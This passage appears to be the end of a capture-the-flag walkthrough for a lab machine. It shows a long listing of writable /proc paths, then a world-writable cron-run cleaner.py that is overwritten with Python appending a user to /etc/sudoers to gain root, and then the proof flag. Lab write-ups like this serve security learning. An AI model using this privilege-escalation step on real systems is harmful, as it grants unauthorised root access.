/proc/1142/task/1192/attr/sockcreate
/proc/1142/task/1193/attr/current
/proc/1142/task/1193/attr/exec
/proc/1142/task/1193/attr/fscreate
/proc/1142/task/1193/attr/keycreate
/proc/1142/task/1193/attr/sockcreate
/proc/1142/task/1194/attr/current
/proc/1142/task/1194/attr/exec
/proc/1142/task/1194/attr/fscreate
/proc/1142/task/1194/attr/keycreate
/proc/1142/task/1194/attr/sockcreate
/proc/1142/task/1195/attr/current
/proc/1142/task/1195/attr/exec
/proc/1142/task/1195/attr/fscreate
/proc/1142/task/1195/attr/keycreate
/proc/1142/task/1195/attr/sockcreate
/proc/1142/task/1196/attr/current
/proc/1142/task/1196/attr/exec
/proc/1142/task/1196/attr/fscreate
/proc/1142/task/1196/attr/keycreate
/proc/1142/task/1196/attr/sockcreate
/proc/1142/task/1197/attr/current
/proc/1142/task/1197/attr/exec
/proc/1142/task/1197/attr/fscreate
/proc/1142/task/1197/attr/keycreate
/proc/1142/task/1197/attr/sockcreate
/proc/1142/attr/current
/proc/1142/attr/exec
/proc/1142/attr/fscreate
/proc/1142/attr/keycreate
/proc/1142/attr/sockcreate
/proc/1143/task/1143/attr/current
/proc/1143/task/1143/attr/exec
/proc/1143/task/1143/attr/fscreate
/proc/1143/task/1143/attr/keycreate
/proc/1143/task/1143/attr/sockcreate
/proc/1143/task/1146/attr/current
/proc/1143/task/1146/attr/exec
/proc/1143/task/1146/attr/fscreate
/proc/1143/task/1146/attr/keycreate
/proc/1143/task/1146/attr/sockcreate
/proc/1143/task/1147/attr/current
/proc/1143/task/1147/attr/exec
/proc/1143/task/1147/attr/fscreate
/proc/1143/task/1147/attr/keycreate
/proc/1143/task/1147/attr/sockcreate
/proc/1143/task/1148/attr/current
/proc/1143/task/1148/attr/exec
/proc/1143/task/1148/attr/fscreate
/proc/1143/task/1148/attr/keycreate
/proc/1143/task/1148/attr/sockcreate
/proc/1143/task/1149/attr/current
/proc/1143/task/1149/attr/exec
/proc/1143/task/1149/attr/fscreate
/proc/1143/task/1149/attr/keycreate
/proc/1143/task/1149/attr/sockcreate
/proc/1143/task/1150/attr/current
/proc/1143/task/1150/attr/exec
/proc/1143/task/1150/attr/fscreate
/proc/1143/task/1150/attr/keycreate
/proc/1143/task/1150/attr/sockcreate
/proc/1143/task/1151/attr/current
/proc/1143/task/1151/attr/exec
/proc/1143/task/1151/attr/fscreate
/proc/1143/task/1151/attr/keycreate
/proc/1143/task/1151/attr/sockcreate
/proc/1143/task/1152/attr/current
/proc/1143/task/1152/attr/exec
/proc/1143/task/1152/attr/fscreate
/proc/1143/task/1152/attr/keycreate
/proc/1143/task/1152/attr/sockcreate
/proc/1143/task/1153/attr/current
/proc/1143/task/1153/attr/exec
/proc/1143/task/1153/attr/fscreate
/proc/1143/task/1153/attr/keycreate
/proc/1143/task/1153/attr/sockcreate
/proc/1143/task/1154/attr/current
/proc/1143/task/1154/attr/exec
/proc/1143/task/1154/attr/fscreate
/proc/1143/task/1154/attr/keycreate
/proc/1143/task/1154/attr/sockcreate
/proc/1143/task/1155/attr/current
/proc/1143/task/1155/attr/exec
/proc/1143/task/1155/attr/fscreate
/proc/1143/task/1155/attr/keycreate
/proc/1143/task/1155/attr/sockcreate
/proc/1143/task/1156/attr/current
/proc/1143/task/1156/attr/exec
/proc/1143/task/1156/attr/fscreate
/proc/1143/task/1156/attr/keycreate
/proc/1143/task/1156/attr/sockcreate
/proc/1143/task/1157/attr/current
/proc/1143/task/1157/attr/exec
/proc/1143/task/1157/attr/fscreate
/proc/1143/task/1157/attr/keycreate
/proc/1143/task/1157/attr/sockcreate
/proc/1143/task/1158/attr/current
/proc/1143/task/1158/attr/exec
/proc/1143/task/1158/attr/fscreate
/proc/1143/task/1158/attr/keycreate
/proc/1143/task/1158/attr/sockcreate
/proc/1143/task/1159/attr/current
/proc/1143/task/1159/attr/exec
/proc/1143/task/1159/attr/fscreate
/proc/1143/task/1159/attr/keycreate
/proc/1143/task/1159/attr/sockcreate
/proc/1143/task/1160/attr/current
/proc/1143/task/1160/attr/exec
/proc/1143/task/1160/attr/fscreate
/proc/1143/task/1160/attr/keycreate
/proc/1143/task/1160/attr/sockcreate
/proc/1143/task/1161/attr/current
/proc/1143/task/1161/attr/exec
/proc/1143/task/1161/attr/fscreate
/proc/1143/task/1161/attr/keycreate
/proc/1143/task/1161/attr/sockcreate
/proc/1143/task/1162/attr/current
/proc/1143/task/1162/attr/exec
/proc/1143/task/1162/attr/fscreate
/proc/1143/task/1162/attr/keycreate
/proc/1143/task/1162/attr/sockcreate
/proc/1143/task/1163/attr/current
/proc/1143/task/1163/attr/exec
/proc/1143/task/1163/attr/fscreate
/proc/1143/task/1163/attr/keycreate
/proc/1143/task/1163/attr/sockcreate
/proc/1143/task/1164/attr/current
/proc/1143/task/1164/attr/exec
/proc/1143/task/1164/attr/fscreate
/proc/1143/task/1164/attr/keycreate
/proc/1143/task/1164/attr/sockcreate
/proc/1143/task/1165/attr/current
/proc/1143/task/1165/attr/exec
/proc/1143/task/1165/attr/fscreate
/proc/1143/task/1165/attr/keycreate
/proc/1143/task/1165/attr/sockcreate
/proc/1143/task/1166/attr/current
/proc/1143/task/1166/attr/exec
/proc/1143/task/1166/attr/fscreate
/proc/1143/task/1166/attr/keycreate
/proc/1143/task/1166/attr/sockcreate
/proc/1143/task/1167/attr/current
/proc/1143/task/1167/attr/exec
/proc/1143/task/1167/attr/fscreate
/proc/1143/task/1167/attr/keycreate
/proc/1143/task/1167/attr/sockcreate
/proc/1143/task/1168/attr/current
/proc/1143/task/1168/attr/exec
/proc/1143/task/1168/attr/fscreate
/proc/1143/task/1168/attr/keycreate
/proc/1143/task/1168/attr/sockcreate
/proc/1143/task/1169/attr/current
/proc/1143/task/1169/attr/exec
/proc/1143/task/1169/attr/fscreate
/proc/1143/task/1169/attr/keycreate
/proc/1143/task/1169/attr/sockcreate
/proc/1143/task/1170/attr/current
/proc/1143/task/1170/attr/exec
/proc/1143/task/1170/attr/fscreate
/proc/1143/task/1170/attr/keycreate
/proc/1143/task/1170/attr/sockcreate
/proc/1143/task/1171/attr/current
/proc/1143/task/1171/attr/exec
/proc/1143/task/1171/attr/fscreate
/proc/1143/task/1171/attr/keycreate
/proc/1143/task/1171/attr/sockcreate
/proc/1143/attr/current
/proc/1143/attr/exec
/proc/1143/attr/fscreate
/proc/1143/attr/keycreate
/proc/1143/attr/sockcreate
/proc/1218/task/1218/attr/current
/proc/1218/task/1218/attr/exec
/proc/1218/task/1218/attr/fscreate
/proc/1218/task/1218/attr/keycreate
/proc/1218/task/1218/attr/sockcreate
/proc/1218/task/1230/attr/current
/proc/1218/task/1230/attr/exec
/proc/1218/task/1230/attr/fscreate
/proc/1218/task/1230/attr/keycreate
/proc/1218/task/1230/attr/sockcreate
/proc/1218/task/1231/attr/current
/proc/1218/task/1231/attr/exec
/proc/1218/task/1231/attr/fscreate
/proc/1218/task/1231/attr/keycreate
/proc/1218/task/1231/attr/sockcreate
/proc/1218/attr/current
/proc/1218/attr/exec
/proc/1218/attr/fscreate
/proc/1218/attr/keycreate
/proc/1218/attr/sockcreate
/proc/1267/task/1267/attr/current
/proc/1267/task/1267/attr/exec
/proc/1267/task/1267/attr/fscreate
/proc/1267/task/1267/attr/keycreate
/proc/1267/task/1267/attr/sockcreate
/proc/1267/attr/current
/proc/1267/attr/exec
/proc/1267/attr/fscreate
/proc/1267/attr/keycreate
/proc/1267/attr/sockcreate
/proc/1285/task/1285/attr/current
/proc/1285/task/1285/attr/exec
/proc/1285/task/1285/attr/fscreate
/proc/1285/task/1285/attr/keycreate
/proc/1285/task/1285/attr/sockcreate
/proc/1285/attr/current
/proc/1285/attr/exec
/proc/1285/attr/fscreate
/proc/1285/attr/keycreate
/proc/1285/attr/sockcreate
/proc/1801/task/1801/attr/current
/proc/1801/task/1801/attr/exec
/proc/1801/task/1801/attr/fscreate
/proc/1801/task/1801/attr/keycreate
/proc/1801/task/1801/attr/sockcreate
/proc/1801/attr/current
/proc/1801/attr/exec
/proc/1801/attr/fscreate
/proc/1801/attr/keycreate
/proc/1801/attr/sockcreate
/proc/1825/task/1825/attr/current
/proc/1825/task/1825/attr/exec
/proc/1825/task/1825/attr/fscreate
/proc/1825/task/1825/attr/keycreate
/proc/1825/task/1825/attr/sockcreate
/proc/1825/attr/current
/proc/1825/attr/exec
/proc/1825/attr/fscreate
/proc/1825/attr/keycreate
/proc/1825/attr/sockcreate
/proc/1868/task/1868/attr/current
/proc/1868/task/1868/attr/exec
/proc/1868/task/1868/attr/fscreate
/proc/1868/task/1868/attr/keycreate
/proc/1868/task/1868/attr/sockcreate
/proc/1868/attr/current
/proc/1868/attr/exec
/proc/1868/attr/fscreate
/proc/1868/attr/keycreate
/proc/1868/attr/sockcreate
/proc/1886/task/1886/attr/current
/proc/1886/task/1886/attr/exec
/proc/1886/task/1886/attr/fscreate
/proc/1886/task/1886/attr/keycreate
/proc/1886/task/1886/attr/sockcreate
/proc/1886/attr/current
/proc/1886/attr/exec
/proc/1886/attr/fscreate
/proc/1886/attr/keycreate
/proc/1886/attr/sockcreate
/proc/1887/task/1887/sched
/proc/1887/task/1887/comm
/proc/1887/task/1887/mem
/proc/1887/task/1887/clear_refs
/proc/1887/task/1887/attr/current
/proc/1887/task/1887/attr/exec
/proc/1887/task/1887/attr/fscreate
/proc/1887/task/1887/attr/keycreate
/proc/1887/task/1887/attr/sockcreate
/proc/1887/task/1887/oom_adj
/proc/1887/task/1887/oom_score_adj
/proc/1887/task/1887/loginuid
/proc/1887/task/1887/uid_map
/proc/1887/task/1887/gid_map
/proc/1887/task/1887/projid_map
/proc/1887/sched
/proc/1887/autogroup
/proc/1887/comm
/proc/1887/mem
/proc/1887/clear_refs
/proc/1887/attr/current
/proc/1887/attr/exec
/proc/1887/attr/fscreate
/proc/1887/attr/keycreate
/proc/1887/attr/sockcreate
/proc/1887/oom_adj
/proc/1887/oom_score_adj
/proc/1887/loginuid
/proc/1887/coredump_filter
/proc/1887/uid_map
/proc/1887/gid_map
/proc/1887/projid_map
/proc/1890/task/1890/sched
/proc/1890/task/1890/comm
/proc/1890/task/1890/mem
/proc/1890/task/1890/clear_refs
/proc/1890/task/1890/attr/current
/proc/1890/task/1890/attr/exec
/proc/1890/task/1890/attr/fscreate
/proc/1890/task/1890/attr/keycreate
/proc/1890/task/1890/attr/sockcreate
/proc/1890/task/1890/oom_adj
/proc/1890/task/1890/oom_score_adj
/proc/1890/task/1890/loginuid
/proc/1890/task/1890/uid_map
/proc/1890/task/1890/gid_map
/proc/1890/task/1890/projid_map
/proc/1890/sched
/proc/1890/autogroup
/proc/1890/comm
/proc/1890/mem
/proc/1890/clear_refs
/proc/1890/attr/current
/proc/1890/attr/exec
/proc/1890/attr/fscreate
/proc/1890/attr/keycreate
/proc/1890/attr/sockcreate
/proc/1890/oom_adj
/proc/1890/oom_score_adj
/proc/1890/loginuid
/proc/1890/coredump_filter
/proc/1890/uid_map
/proc/1890/gid_map
/proc/1890/projid_map
/lib/log/cleaner.py
```

```
$ cat cronlog
*/2 * * * * cleaner.py
```

Now we edit the cleaner.py file to add overflow user to sudoers file in etc.
```
$ cat cleaner.py
#!/usr/bin/env python
import os
import sys
try:
	os.system("echo 'overflow ALL=(ALL:ALL) ALL' >> /etc/sudoers")
except:
	sys.exit()
```
Then we have root access in 2 minutes.
```
root@troll:~# cat proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```
